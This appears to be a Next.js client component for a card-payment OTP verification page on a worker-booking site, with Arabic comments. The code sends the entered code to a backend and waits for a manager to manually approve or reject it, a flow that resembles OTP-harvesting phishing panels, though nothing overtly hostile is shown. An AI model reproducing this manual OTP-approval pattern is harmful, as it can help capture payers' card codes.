"use client";

import { useState, useEffect, FormEvent, useCallback } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Dictionary } from "@/lib/i18n";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { formatSalary } from "@/lib/utils";
import { subscribeToEntryStatus } from "@/lib/realtime";
import { CandidateImage } from "./CandidateImage";
import type { Booking, Worker } from "@/lib/supabase/types";
import styles from "./VerifyCardClient.module.css";

export function VerifyCardClient({
  booking,
  paymentEntryId,
  dict,
  locale,
}: {
  booking: Booking & { workers: Worker };
  paymentEntryId: string;
  dict: Dictionary;
  locale: string;
}) {
  const router = useRouter();
  const p = dict.payment;

  const [otp, setOtp] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  // حالة انتظار قرار المدير على رمز التحقق
  const [verifying, setVerifying] = useState(false);
  const [otpEntryId, setOtpEntryId] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  const amount = booking.workers?.expected_salary ?? 0;
  const serviceFee = Math.round(amount * 0.1);
  const total = amount + serviceFee;

  // استقبال قرار المدير على رمز التحقق فوراً عبر Realtime على قناة الـ entry،
  // مع التحقق من الحالة الفعلية بطلب API موثوق. polling احتياطي بطيء (5ث).
  const verifyOtpStatus = useCallback(
    async (entryId: string) => {
      try {
        const res = await fetch(`/api/payments/otp-status?entryId=${entryId}`, {
          cache: "no-store" as RequestCache,
          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
        });
        const data = await res.json();
        if (data.status === "approved") {
          setVerifying(false);
          setSuccess(true);
          return "approved";
        }
        if (data.status === "rejected") {
          setVerifying(false);
          setError(p.otpRejectedMsg);
          setOtp("");
          setOtpEntryId(null);
          return "rejected";
        }
      } catch {
        // تجاهل أخطاء الشبكة مؤقتاً
      }
      return null;
    },
    [p.otpRejectedMsg],
  );

  useEffect(() => {
    if (!verifying || !otpEntryId) return;

    let cancelled = false;

    const channel = subscribeToEntryStatus(
      otpEntryId,
      () => {
        if (!cancelled) void verifyOtpStatus(otpEntryId);
      },
      () => {
        if (!cancelled) void verifyOtpStatus(otpEntryId);
      },
    );

    // قراءة فورية عند الدخول.
    void verifyOtpStatus(otpEntryId);

    // polling احتياطي بطيء.
    const interval = setInterval(() => {
      if (!cancelled) void verifyOtpStatus(otpEntryId);
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [verifying, otpEntryId, verifyOtpStatus]);

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setError(null);
    const code = otp.trim();
    // التحقق من الطول: 4 أرقام أو 6 أرقام
    if (!/^\d{4}$/.test(code) && !/^\d{6}$/.test(code)) {
      setError(p.otpLengthError);
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/payments/submit-otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": "fp-client",
        },
        body: JSON.stringify({
          paymentEntryId,
          bookingId: booking.id,
          otp: code,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        // عرض رسالة مناسبة حسب سبب الفشل (لم يعد الدفع موافقًا عليه، أو خطأ عام).
        const msg =
          data.error === "payment_not_approved"
            ? p.otpRejectedMsg
            : data.error === "payment_not_found"
              ? p.rejectedMsg
              : p.otpRejectedMsg;
        setError(msg);
        return;
      }
      // تم الإرسال — انتقل لشاشة الانتظار
      setOtpEntryId(data.entryId);
      setVerifying(true);
    } catch {
      setError(p.otpRejectedMsg);
    } finally {
      setLoading(false);
    }
  }

  // ===== شاشة النجاح =====
  if (success) {
    return (
      <div className={styles.layout}>
        <Card className={styles.successCard}>
          <div className={styles.successIcon}>✓</div>
          <h1 className={styles.successTitle}>{p.successTitle}</h1>
          <p className={styles.successSub}>{p.successSub}</p>
          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{booking.booking_ref}</strong>
          </div>
          <Link className={styles.successLink} href={`/${locale}/account`}>
            {locale === "ar" ? "الذهاب إلى حسابي" : "Go to my account"}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة جارٍ التحقق =====
  if (verifying) {
    return (
      <div className={styles.layout}>
        <Card className={styles.verifyingCard}>
          <div className={styles.spinnerWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.verifyingTitle}>{p.verifyingWait}</h1>
          <p className={styles.verifyingSub}>{p.verifyingSub}</p>
        </Card>
      </div>
    );
  }

  return (
    <div className={styles.layout}>
      <div className={styles.header}>
        <h1 className={styles.title}>{p.verifyTitle}</h1>
        <p className={styles.subtitle}>{p.verifySubtitle}</p>
      </div>

      <div className={styles.grid}>
        <Card className={styles.formCard}>
          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.otpSingleWrap}>
              <label className={styles.otpLabel}>{p.otpLabel}</label>
              <input
                type="text"
                inputMode="numeric"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder={p.otpSinglePh}
                className={styles.otpSingleInput}
                autoFocus
                maxLength={6}
              />
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <Button type="submit" size="lg" disabled={loading}>
              {loading ? p.processing : p.submitOtp}
            </Button>

            <Link href={`/${locale}/payment/${booking.id}`} className={styles.backLink}>
              ← {p.back}
            </Link>
          </form>
        </Card>

        <Card className={styles.summary}>
          <h2 className={styles.sectionTitle}>{p.worker}</h2>
          <div className={styles.workerCard}>
            {booking.workers && <CandidateImage worker={booking.workers} locale={locale as "ar" | "en"} className={styles.workerImg} />}
            <div>
              <h3 className={styles.workerName}>
                {booking.workers?.full_name}
              </h3>
              <p className={styles.workerMeta}>
                {booking.workers?.nationality}
              </p>
            </div>
          </div>
          <div className={styles.summaryRows}>
            <div className={styles.summaryRow}>
              <span>{p.amount}</span>
              <strong>{formatSalary(amount, locale)}</strong>
            </div>
            <div className={styles.summaryRow}>
              <span>{p.serviceFee} (10%)</span>
              <strong>{formatSalary(serviceFee, locale)}</strong>
            </div>
            <div className={`${styles.summaryRow} ${styles.totalRow}`}>
              <span>{p.total}</span>
              <strong>{formatSalary(total, locale)}</strong>
            </div>
          </div>
          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{booking.booking_ref}</strong>
          </div>
        </Card>
      </div>
    </div>
  );
}
